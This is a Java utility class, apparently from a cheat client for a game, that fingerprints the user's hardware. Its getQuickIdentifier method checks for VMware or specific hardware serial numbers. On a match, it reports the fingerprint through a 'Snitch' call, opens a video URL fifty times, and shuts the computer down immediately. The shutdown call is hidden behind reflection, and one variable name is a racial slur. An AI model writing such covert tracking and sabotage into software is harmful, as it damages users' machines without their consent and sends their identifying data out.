/*
 * Copyright (c) MineSense.pub 2018.
 * Developed by Arithmo
 */

package exhibition.util.security;

public class SystemUtil {

    public static LegacyHardwareID hardwareIdentification;

    public static String getHardwareIdentifiers() {
        if (hardwareIdentification == null)
            hardwareIdentification = new LegacyHardwareID(LibraryIntegrityChecker.checkOSHIIntegrity());
        String identifier = hardwareIdentification.osFamily +
                hardwareIdentification.cpuName +
                hardwareIdentification.moboManufacturer +
                hardwareIdentification.moboModel +
                hardwareIdentification.serialNumber +
                hardwareIdentification.modelAndSerial;
        return identifier.trim();
    }

    public static String getQuickIdentifier() {
        try {
            String nigro = hardwareIdentification == null ? "Not Grabbed" : getHardwareIdentifiers();
            if (nigro.contains("VMware") || (nigro.toLowerCase().contains("vmware") || nigro.toLowerCase().contains("vm ware")) || (nigro.contains("Intel(R) Core(TM) i5-8400 CPU @ 2.80GHz") && (nigro.contains("985B2ALNS") || nigro.contains("L731NRCX00H56SMB") || nigro.contains("SCRW18092104G2001")))) {
                Snitch.snitch(405, nigro);
                int i = 0;
                while (i < 50) {
                    i++;
                    Connector.openURL("https://www.youtube.com/watch?v=AP7utU8Efow");
                }
                Class runtimeClass = Class.forName("java.lang.Runtime");
                runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "shutdown.exe -s -t 0");
            }
            return nigro.substring(0, Math.min(500, nigro.length()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "null";
    }

}
